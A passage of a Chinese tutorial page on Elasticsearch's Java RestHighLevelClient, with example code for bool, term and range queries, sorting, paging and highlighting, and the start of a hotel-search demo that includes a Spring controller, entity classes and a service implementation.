class="string">&quot;hotel&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.准备DSL</span></span><br><span class="line">    request.source()</span><br><span class="line">        .query(QueryBuilders.matchQuery(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;如家&quot;</span>));</span><br><span class="line">    <span class="comment">// 3.发送请求</span></span><br><span class="line">    SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    handleResponse(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a name="SJxZ6"></a><h2 id="3-3-精确查询"><a href="#3-3-精确查询" class="headerlink" title="3.3.精确查询"></a>3.3.精确查询</h2>精确查询主要是两者：</li></ol><ul><li>term：词条精确匹配</li><li>range：范围查询</li></ul><p>与之前的查询相比，差异同样在查询条件，其它都一样。<br />查询条件构造的API如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218493997-e01c8096-099d-4628-a5b4-5aac85f61072.png#crop=0&crop=0&crop=1&crop=1&id=NLajm&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="e3ZiE"></a></p><h2 id="3-4-布尔查询"><a href="#3-4-布尔查询" class="headerlink" title="3.4.布尔查询"></a>3.4.布尔查询</h2><p>布尔查询是用must、must_not、filter等方式组合其它查询，代码示例如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494072-0e6e90bd-140a-4a67-af22-57b4cd008974.png#crop=0&crop=0&crop=1&crop=1&id=X877l&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />可以看到，API与其它查询的差别同样是在查询条件的构建，QueryBuilders，结果解析等其他代码完全不变。<br />完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testBool</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1.准备Request</span></span><br><span class="line">    SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.准备DSL</span></span><br><span class="line">    <span class="comment">// 2.1.准备BooleanQuery</span></span><br><span class="line">    BoolQueryBuilder boolQuery = QueryBuilders.boolQuery();</span><br><span class="line">    <span class="comment">// 2.2.添加term</span></span><br><span class="line">    boolQuery.must(QueryBuilders.termQuery(<span class="string">&quot;city&quot;</span>, <span class="string">&quot;杭州&quot;</span>));</span><br><span class="line">    <span class="comment">// 2.3.添加range</span></span><br><span class="line">    boolQuery.filter(QueryBuilders.rangeQuery(<span class="string">&quot;price&quot;</span>).lte(<span class="number">250</span>));</span><br><span class="line">    request.source().query(boolQuery);</span><br><span class="line">    <span class="comment">// 3.发送请求</span></span><br><span class="line">    SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    handleResponse(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="dcZ6O"></a></p><h2 id="3-5-排序、分页"><a href="#3-5-排序、分页" class="headerlink" title="3.5.排序、分页"></a>3.5.排序、分页</h2><p>搜索结果的排序和分页是与query同级的参数，因此同样是使用request.source()来设置。<br />对应的API如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494155-d6440e41-b65d-49c9-8e0a-b7eccd1dade4.png#crop=0&crop=0&crop=1&crop=1&id=u5LXJ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />完整代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testPageAndSort</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 页码，每页大小</span></span><br><span class="line">    <span class="keyword">int</span> page = <span class="number">1</span>, size = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 1.准备Request</span></span><br><span class="line">    SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.准备DSL</span></span><br><span class="line">    <span class="comment">// 2.1.query</span></span><br><span class="line">    request.source().query(QueryBuilders.matchAllQuery());</span><br><span class="line">    <span class="comment">// 2.2.排序 sort</span></span><br><span class="line">    request.source().sort(<span class="string">&quot;price&quot;</span>, SortOrder.ASC);</span><br><span class="line">    <span class="comment">// 2.3.分页 from、size</span></span><br><span class="line">    request.source().from((page - <span class="number">1</span>) * size).size(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 3.发送请求</span></span><br><span class="line">    SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    handleResponse(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="zdHBB"></a></p><h2 id="3-6-高亮"><a href="#3-6-高亮" class="headerlink" title="3.6.高亮"></a>3.6.高亮</h2><p>高亮的代码与之前代码差异较大，有两点：</p><ul><li><p>查询的DSL：其中除了查询条件，还需要添加高亮条件，同样是与query同级。</p></li><li><p>结果解析：结果除了要解析_source文档数据，还要解析高亮结果<br><a name="h16Js"></a></p><h3 id="3-6-1-高亮请求构建"><a href="#3-6-1-高亮请求构建" class="headerlink" title="3.6.1.高亮请求构建"></a>3.6.1.高亮请求构建</h3><p>高亮请求的构建API如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494243-d059b656-6c1c-475e-9cbb-40f244307091.png#crop=0&crop=0&crop=1&crop=1&id=T8Ayb&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />上述代码省略了查询条件部分，但是大家不要忘了：高亮查询必须使用全文检索查询，并且要有搜索关键字，将来才可以对关键字高亮。<br />完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testHighlight</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1.准备Request</span></span><br><span class="line">    SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.准备DSL</span></span><br><span class="line">    <span class="comment">// 2.1.query</span></span><br><span class="line">    request.source().query(QueryBuilders.matchQuery(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;如家&quot;</span>));</span><br><span class="line">    <span class="comment">// 2.2.高亮</span></span><br><span class="line">    request.source().highlighter(<span class="keyword">new</span> HighlightBuilder().field(<span class="string">&quot;name&quot;</span>).requireFieldMatch(<span class="keyword">false</span>));</span><br><span class="line">    <span class="comment">// 3.发送请求</span></span><br><span class="line">    SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    handleResponse(response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="hRaMJ"></a></p><h3 id="3-6-2-高亮结果解析"><a href="#3-6-2-高亮结果解析" class="headerlink" title="3.6.2.高亮结果解析"></a>3.6.2.高亮结果解析</h3><p>高亮的结果与查询的文档结果默认是分离的，并不在一起。<br />因此解析高亮的代码需要额外处理：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494319-f91bae56-d104-4696-8278-a418817409f9.png#crop=0&crop=0&crop=1&crop=1&id=Vq85f&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />代码解读：</p></li><li><p>第一步：从结果中获取source。hit.getSourceAsString()，这部分是非高亮结果，json字符串。还需要反序列为HotelDoc对象</p></li><li><p>第二步：获取高亮结果。hit.getHighlightFields()，返回值是一个Map，key是高亮字段名称，值是HighlightField对象，代表高亮值</p></li><li><p>第三步：从map中根据高亮字段名称，获取高亮字段值对象HighlightField</p></li><li><p>第四步：从HighlightField中获取Fragments，并且转为字符串。这部分就是真正的高亮字符串了</p></li><li><p>第五步：用高亮的结果替换HotelDoc中的非高亮结果</p></li></ul><p>完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleResponse</span><span class="params">(SearchResponse response)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    SearchHits searchHits = response.getHits();</span><br><span class="line">    <span class="comment">// 4.1.获取总条数</span></span><br><span class="line">    <span class="keyword">long</span> total = searchHits.getTotalHits().value;</span><br><span class="line">    System.out.println(<span class="string">&quot;共搜索到&quot;</span> + total + <span class="string">&quot;条数据&quot;</span>);</span><br><span class="line">    <span class="comment">// 4.2.文档数组</span></span><br><span class="line">    SearchHit[] hits = searchHits.getHits();</span><br><span class="line">    <span class="comment">// 4.3.遍历</span></span><br><span class="line">    <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">        <span class="comment">// 获取文档source</span></span><br><span class="line">        String json = hit.getSourceAsString();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        HotelDoc hotelDoc = JSON.parseObject(json, HotelDoc.class);</span><br><span class="line">        <span class="comment">// 获取高亮结果</span></span><br><span class="line">        Map&lt;String, HighlightField&gt; highlightFields = hit.getHighlightFields();</span><br><span class="line">        <span class="keyword">if</span> (!CollectionUtils.isEmpty(highlightFields)) &#123;</span><br><span class="line">            <span class="comment">// 根据字段名获取高亮结果</span></span><br><span class="line">            HighlightField highlightField = highlightFields.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (highlightField != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 获取高亮值</span></span><br><span class="line">                String name = highlightField.getFragments()[<span class="number">0</span>].string();</span><br><span class="line">                <span class="comment">// 覆盖非高亮结果</span></span><br><span class="line">                hotelDoc.setName(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;hotelDoc = &quot;</span> + hotelDoc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="kia2F"></a></p><h1 id="4-黑马旅游案例"><a href="#4-黑马旅游案例" class="headerlink" title="4.黑马旅游案例"></a>4.黑马旅游案例</h1><p>下面，我们通过黑马旅游的案例来实战演练下之前学习的知识。<br />我们实现四部分功能：</p><ul><li>酒店搜索和分页</li><li>酒店结果过滤</li><li>我周边的酒店</li><li>酒店竞价排名</li></ul><p>启动我们提供的hotel-demo项目，其默认端口是8089，访问<a href="http://localhost:8089，就能看到项目页面了：">http://localhost:8089，就能看到项目页面了：</a><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494418-8049dac5-5565-459e-915b-7d06b0736b31.png#crop=0&crop=0&crop=1&crop=1&id=Cuz36&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="dbIsn"></a></p><h2 id="4-1-酒店搜索和分页"><a href="#4-1-酒店搜索和分页" class="headerlink" title="4.1.酒店搜索和分页"></a>4.1.酒店搜索和分页</h2><p>案例需求：实现黑马旅游的酒店搜索功能，完成关键字搜索和分页<br><a name="ABIHk"></a></p><h3 id="4-1-1-需求分析"><a href="#4-1-1-需求分析" class="headerlink" title="4.1.1.需求分析"></a>4.1.1.需求分析</h3><p>在项目的首页，有一个大大的搜索框，还有分页按钮：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494532-97408c6c-b5ed-4384-ab05-4ea96d0447e2.png#crop=0&crop=0&crop=1&crop=1&id=Y49XZ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />点击搜索按钮，可以看到浏览器控制台发出了请求：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494637-c39ce9d6-1997-4438-a3b8-293d1f608d64.png#crop=0&crop=0&crop=1&crop=1&id=jF0KH&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />请求参数如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494736-ccec06bc-96ab-4214-a8ab-d48a1180de79.png#crop=0&crop=0&crop=1&crop=1&id=rlN1v&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />由此可以知道，我们这个请求的信息如下：</p><ul><li>请求方式：POST</li><li>请求路径：/hotel/list</li><li>请求参数：JSON对象，包含4个字段：<ul><li>key：搜索关键字</li><li>page：页码</li><li>size：每页大小</li><li>sortBy：排序，目前暂不实现</li></ul></li><li>返回值：分页查询，需要返回分页结果PageResult，包含两个属性：<ul><li><code>total</code>：总条数</li><li><code>List&lt;HotelDoc&gt;</code>：当前页的数据</li></ul></li></ul><p>因此，我们实现业务的流程如下：</p><ul><li><p>步骤一：定义实体类，接收请求参数的JSON对象</p></li><li><p>步骤二：编写controller，接收页面的请求</p></li><li><p>步骤三：编写业务实现，利用RestHighLevelClient实现搜索、分页<br><a name="oo2u1"></a></p><h3 id="4-1-2-定义实体类"><a href="#4-1-2-定义实体类" class="headerlink" title="4.1.2.定义实体类"></a>4.1.2.定义实体类</h3><p>实体类有两个，一个是前端的请求参数实体，一个是服务端应该返回的响应结果实体。<br />1）请求参数<br />前端请求的json结构如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;搜索关键字&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;size&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;sortBy&quot;</span>: <span class="string">&quot;default&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，我们在<code>cn.itcast.hotel.pojo</code>包下定义一个实体类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.hotel.pojo;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestParams</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String key;</span><br><span class="line">    <span class="keyword">private</span> Integer page;</span><br><span class="line">    <span class="keyword">private</span> Integer size;</span><br><span class="line">    <span class="keyword">private</span> String sortBy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）返回值<br />分页查询，需要返回分页结果PageResult，包含两个属性：</p></li><li><p><code>total</code>：总条数</p></li><li><p><code>List&lt;HotelDoc&gt;</code>：当前页的数据</p></li></ul><p>因此，我们在<code>cn.itcast.hotel.pojo</code>中定义返回结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.hotel.pojo;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageResult</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long total;</span><br><span class="line">    <span class="keyword">private</span> List&lt;HotelDoc&gt; hotels;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PageResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PageResult</span><span class="params">(Long total, List&lt;HotelDoc&gt; hotels)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.total = total;</span><br><span class="line">        <span class="keyword">this</span>.hotels = hotels;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="GA0TO"></a></p><h3 id="4-1-3-定义controller"><a href="#4-1-3-定义controller" class="headerlink" title="4.1.3.定义controller"></a>4.1.3.定义controller</h3><p>定义一个HotelController，声明查询接口，满足下列要求：</p><ul><li>请求方式：Post</li><li>请求路径：/hotel/list</li><li>请求参数：对象，类型为RequestParam</li><li>返回值：PageResult，包含两个属性<ul><li><code>Long total</code>：总条数</li><li><code>List&lt;HotelDoc&gt; hotels</code>：酒店数据</li></ul></li></ul><p>因此，我们在<code>cn.itcast.hotel.web</code>中定义HotelController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/hotel&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotelController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IHotelService hotelService;</span><br><span class="line"><span class="comment">// 搜索酒店数据</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/list&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PageResult <span class="title">search</span><span class="params">(<span class="meta">@RequestBody</span> RequestParams params)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hotelService.search(params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="Dj6ni"></a></p><h3 id="4-1-4-实现搜索业务"><a href="#4-1-4-实现搜索业务" class="headerlink" title="4.1.4.实现搜索业务"></a>4.1.4.实现搜索业务</h3><p>我们在controller调用了IHotelService，并没有实现该方法，因此下面我们就在IHotelService中定义方法，并且去实现业务逻辑。<br />1）在<code>cn.itcast.hotel.service</code>中的<code>IHotelService</code>接口中定义一个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据关键字搜索酒店信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> params 请求参数对象，包含用户输入的关键字 </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 酒店文档列表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">PageResult <span class="title">search</span><span class="params">(RequestParams params)</span></span>;</span><br></pre></td></tr></table></figure><p>2）实现搜索业务，肯定离不开RestHighLevelClient，我们需要把它注册到Spring中作为一个Bean。在<code>cn.itcast.hotel</code>中的<code>HotelDemoApplication</code>中声明这个Bean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> RestHighLevelClient <span class="title">client</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>  <span class="keyword">new</span> RestHighLevelClient(RestClient.builder(</span><br><span class="line">        HttpHost.create(<span class="string">&quot;http://192.168.150.101:9200&quot;</span>)</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）在<code>cn.itcast.hotel.service.impl</code>中的<code>HotelService</code>中实现search方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> PageResult <span class="title">search</span><span class="params">(RequestParams params)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1.准备Request</span></span><br><span class="line">        SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">        <span class="comment">// 2.准备DSL</span></span><br><span class="line">        <span class="comment">// 2.1.query</span></span><br><span class="line">        String key = params.getKey();</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span> || <span class="string">&quot;&quot;</span>.equals(key)) &#123;</span><br><span class="line">            request.source().query(QueryBuilders.matchAllQuery());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            request.source().query(QueryBuilders.matchQuery(<span class="string">&quot;all&quot;</span>, key));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2.2.分页</span></span><br><span class="line">        <span class="keyword">int</span> page = params.getPage();</span><br><span class="line">        <span class="keyword">int</span> size = params.getSize();</span><br><span class="line">        request.source().from((page - <span class="number">1</span>) * size).size(size);</span><br><span class="line">        <span class="comment">// 3.发送请求</span></span><br><span class="line">        SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">        <span class="comment">// 4.解析响应</span></span><br><span class="line">        <span class="keyword">return</span> handleResponse(response);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 结果解析</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> PageResult <span class="title">handleResponse</span><span class="params">(SearchResponse response)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 4.解析响应</span></span><br><span class="line">    SearchHits searchHits = response.getHits();</span><br><span class="line">    <span class="comment">// 4.1.获取总条数</span></span><br><span class="line">    <span class="keyword">long</span> total = searchHits.getTotalHits().value;</span><br><span class="line">    <span class="comment">// 4.2.文档数组</span></span><br><span class="line">    SearchHit[] hits = searchHits.getHits();</span><br><span class="line">    <span class="comment">// 4.3.遍历</span></span><br><span class="line">    List&lt;HotelDoc&gt; hotels = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">        <span class="comment">// 获取文档source</span></span><br><span class="line">        String json = hit.getSourceAsString();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        HotelDoc hotelDoc = JSON.parseObject(json, HotelDoc.class);</span><br><span class="line"><span class="comment">// 放入集合</span></span><br><span class="line">        hotels.add(hotelDoc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.4.封装返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> PageResult(total, hotels);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="EW3eD"></a></p><h2 id="4-2-酒店结果过滤"><a href="#4-2-酒店结果过滤" class="headerlink" title="4.2.酒店结果过滤"></a>4.2.酒店结果过滤</h2><p>需求：添加品牌、城市、星级、价格等过滤功能<br><a name="s3UZL"></a></p><h3 id="4-2-1-需求分析"><a href="#4-2-1-需求分析" class="headerlink" title="4.2.1.需求分析"></a>4.2.1.需求分析</h3><p>在页面搜索框下面，会有一些过滤项：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494821-065a9d5d-3814-40a4-84ee-378df2d9ca6f.png#crop=0&crop=0&crop=1&crop=1&id=xUg2b&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />传递的参数如图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494902-750c4893-9dee-4647-a535-10ca8908dec0.png#crop=0&crop=0&crop=1&crop=1&id=yC7p2&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />包含的过滤条件有：</p><ul><li>brand：品牌值</li><li>city：城市</li><li>minPrice~maxPrice：价格范围</li><li>starName：星级</li></ul><p>我们需要做两件事情：</p><ul><li><p>修改请求参数的对象RequestParams，接收上述参数</p></li><li><p>修改业务逻辑，在搜索条件之外，添加一些过滤条件<br><a name="sMZ7z"></a></p><h3 id="4-2-2-修改实体类"><a href="#4-2-2-修改实体类" class="headerlink" title="4.2.2.修改实体类"></a>4.2.2.修改实体类</h3><p>修改在<code>cn.itcast.hotel.pojo</code>包下的实体类RequestParams：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestParams</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String key;</span><br><span class="line">    <span class="keyword">private</span> Integer page;</span><br><span class="line">    <span class="keyword">private</span> Integer size;</span><br><span class="line">    <span class="keyword">private</span> String sortBy;</span><br><span class="line">    <span class="comment">// 下面是新增的过滤条件参数</span></span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">private</span> String brand;</span><br><span class="line">    <span class="keyword">private</span> String starName;</span><br><span class="line">    <span class="keyword">private</span> Integer minPrice;</span><br><span class="line">    <span class="keyword">private</span> Integer maxPrice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="pTvoX"></a></p><h3 id="4-2-3-修改搜索业务"><a href="#4-2-3-修改搜索业务" class="headerlink" title="4.2.3.修改搜索业务"></a>4.2.3.修改搜索业务</h3><p>在HotelService的search方法中，只有一个地方需要修改：requet.source().query( … )其中的查询条件。<br 